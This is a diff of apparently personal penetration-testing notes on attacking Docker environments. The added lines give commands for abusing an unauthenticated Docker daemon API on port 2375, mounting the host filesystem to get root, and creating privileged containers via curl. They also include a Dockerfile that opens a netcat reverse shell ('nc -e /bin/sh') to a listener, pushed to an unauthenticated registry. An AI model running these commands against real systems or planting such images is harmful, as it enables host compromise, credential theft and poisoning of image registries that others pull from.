@@ -1,3 +1,26 @@
+publishing images to Docker Hub requires docker login
+	stores creds in $HOME/.docker/config.json
+
+look for Docker Daemon API certs in .docker folder of dev machines
+
+
+Unauthenticated Docker Daemon API
+	get containers
+		docker -H tcp://<IP_address>:2375 ps
+	execute a command on a container
+		docker -H tcp://<IP_address>:2375 exec <container_ID> <command_no_quotes_needed>
+	run a container
+		docker -H tcp://<IP_address>:2375 run <image_name>
+	run a container to get root on host OS 
+		docker -H tcp://<IP_address>:2375 run -v /:/hostOS -it --rm chrisfosterelli/rootplease
+
+
+
+
+
+
+
+
 Working with external data 
 	Mount a volume path (-v <host_dir>:<container_dir>)
 	mkdir ~/volume_location
@@ -17,7 +40,7 @@ Copy from/to container
 can override Dockerfile ENTRYPOINT to get shell
 	docker run --entrypoint=/bin/ash -it <image_name>
 
-cap_net_raw can allow for ARP spoofing and MITM - see Etienne's blog (blog.champtar.fr)
+cap_net_raw can allow for ARP spoofing and MITM - see blog.champtar.fr
 
 capabilities can be used to hide privileged binaries 
 	we would usually note anything with SETUID running as root
@@ -25,13 +48,35 @@ capabilities can be used to hide privileged binaries
 		can detect using filecap tool to audit for files with dangerous capabilities
 			filecap <directory>
 
-create a privileged container from an image
-	curl -X POST "http://127.1:2375/images/create?fromImage=<image_name>&tag=<image_tag>"
-	curl --header "Content-Type: application/json" --request POST --data '{"Image": "<image_name>", "Privileged": true}' http://127.1:2375/containers/create
+create a privileged container from an image using Docker daemon
+	curl -X POST "http://<IP_address>:2375/images/create?fromImage=<image_name>&tag=<image_tag>"
+	curl --header "Content-Type: application/json" --request POST --data '{"Image": "<image_name>", "Privileged": true}' http://<IP_address>:2375/containers/create
 		this will return an image ID for use in launching it
 
-launch a privileged container from an image
-	curl -X POST http://127.1:2375/containers/<ID>/start
+launch a privileged container from an image using Docker daemon
+	curl -X POST http://<IP_address>:2375/containers/<ID>/start
+
+push a malicious image to an unauthenticated repo
+	Dockerfile
+		FROM debian:jessie-slim
+		RUN apt-get update -y
+		RUN apt-get install netcat -y
+		RUN nc -e /bin/sh <listener_IP> <listener_port>
+
+	Build image with tag (tag req'd to push to remote registries other than Docker Hub)
+		docker build -t <image_name>:<version_tag> <path/to/Dockerfile>
+		
+	Push image to repo
+		docker login 	#auth'n to repo - not necessary for unauthenticated repo
+
+		docker tag <image_name>:<version_tag> <repo>/<image_name>:<version_tag>
+			**Image Naming outside DockerHub**
+				registryDomain/imageName:tag
+				DockerHub is default registryDomain
+					docker.io/library/<image>
+			Creates copy of local image tagged named for repo/image:version
+
+		docker push <repo>/<image_name>:<version>
 
 
 
